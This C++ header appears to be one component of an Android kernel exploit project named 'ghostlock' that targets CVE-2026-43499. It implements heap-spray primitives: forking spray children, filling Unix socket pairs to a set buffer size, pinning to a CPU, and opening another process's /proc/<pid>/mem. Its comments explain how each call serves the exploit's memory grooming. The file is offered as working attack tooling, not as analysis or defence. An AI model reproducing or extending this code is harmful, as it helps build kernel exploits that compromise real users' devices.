#pragma once
/** @file backend/cve_2026_43499/memory/heap_seam_linux.hpp
 *  The heap seam on the platform this runs on: no decisions, only calls.
 *
 *  Android only, and deliberately not part of the host build: it calls the kernel.
 *  Kept apart from the shape above for the same reason the futex seam is kept apart
 *  from the race -- the shape is testable anywhere, this is provable on a device.
 *
 *  Each operation answers with its return value and the errno beside it, and does
 *  nothing else: no retry, no fallback, no interpreting what a failure means.
 */
#include <cerrno>
#include <cstddef>
#include <cstdio>
#include <cstdint>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "backend/cve_2026_43499/memory/heap_seam.hpp"

namespace ghostlock::backend::cve_2026_43499::memory {
    struct LinuxHeapSeam final {
        static SeamResult page_size() noexcept {
            errno = 0;
            const long size = ::sysconf(_SC_PAGESIZE);
            return SeamResult{static_cast<std::int64_t>(size), errno};
        }

        /** Open the memory of another process, which is what the spray children are for: the
         *  descriptor keeps their address space alive and is what the parent reads them through.
         *  The retired tree opened /proc/<pid>/mem read-only, and its clone_memfd helper did so
         *  before killing the child, which is why a child that leaves at once is not a problem.
         *  Opening a memfd_create of our own would answer a different question and was a placeholder.
         *  @param pid  The process whose memory is wanted.
         *  @return     The descriptor, or a negative value with errno set. A pid of zero, which is
         *              not a process, is refused before the path is built. */
        static SeamResult open_memfd(std::uint64_t pid) noexcept {
            errno = 0;
            if (pid == 0U) {
                errno = EINVAL;
                return SeamResult{-1, errno};
            }
            char path[64] = {};
            /* Bounded by construction: the widest pid is a uint64 in theory and 20 digits in
             *  practice, and the literal around it is 11 bytes. */
            const int written = ::snprintf(path, sizeof(path), "/proc/%llu/mem",
                                           static_cast<unsigned long long>(pid));
            if (written <= 0 || static_cast<std::size_t>(written) >= sizeof(path)) {
                errno = ENAMETOOLONG;
                return SeamResult{-1, errno};
            }
            const int fd = ::open(path, O_RDONLY);
            return SeamResult{static_cast<std::int64_t>(fd), errno};
        }

        static SeamResult close_fd(std::int32_t fd) noexcept {
            errno = 0;
            const int rc = ::close(fd);
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static SeamResult socket_pair(std::int32_t *out) noexcept {
            errno = 0;
            int fds[2] = {-1, -1};
            const int rc = ::socketpair(AF_UNIX, SOCK_STREAM, 0, fds);
            if (rc == 0 && out != nullptr) {
                out[0] = fds[0];
                out[1] = fds[1];
            }
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static SeamResult set_socket_buffer(std::int32_t fd, std::int32_t bytes) noexcept {
            errno = 0;
            const int rc = ::setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &bytes, sizeof(bytes));
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static SeamResult set_nonblocking(std::int32_t fd) noexcept {
            errno = 0;
            const int flags = ::fcntl(fd, F_GETFL, 0);
            if (flags < 0) {
                return SeamResult{-1, errno};
            }
            const int rc = ::fcntl(fd, F_SETFL, flags | O_NONBLOCK);
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static SeamResult send_buffer(std::int32_t fd, std::size_t bytes) noexcept {
            errno = 0;
            static unsigned char buffer[1U << 20U];
            const std::size_t capped = bytes < sizeof(buffer) ? bytes : sizeof(buffer);
            const ssize_t sent = ::send(fd, buffer, capped, 0);
            return SeamResult{static_cast<std::int64_t>(sent), errno};
        }

        static SeamResult fork_child() noexcept {
            errno = 0;
            const pid_t pid = ::fork();
            return SeamResult{static_cast<std::int64_t>(pid), errno};
        }

        static SeamResult stop_child(std::uint64_t pid) noexcept {
            errno = 0;
            const int rc = ::kill(static_cast<pid_t>(pid), SIGKILL);
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static SeamResult yield_now() noexcept {
            errno = 0;
            const int rc = ::sched_yield();
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }

        static void exit_child() noexcept {
            ::_exit(0);
        }

        static SeamResult pin_to_processor(std::int32_t cpu) noexcept {
            errno = 0;
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(static_cast<size_t>(cpu), &set);
            const int rc = ::sched_setaffinity(0, sizeof(set), &set);
            return SeamResult{static_cast<std::int64_t>(rc), errno};
        }
    };

    /* The device implementation answers the shape, checked here rather than at the call
     *  site: a seam that answers nine of eleven operations is not a seam. */
    static_assert(HeapSeam<LinuxHeapSeam>, "the device seam answers every call the shape names");
}  // namespace ghostlock::backend::cve_2026_43499::memory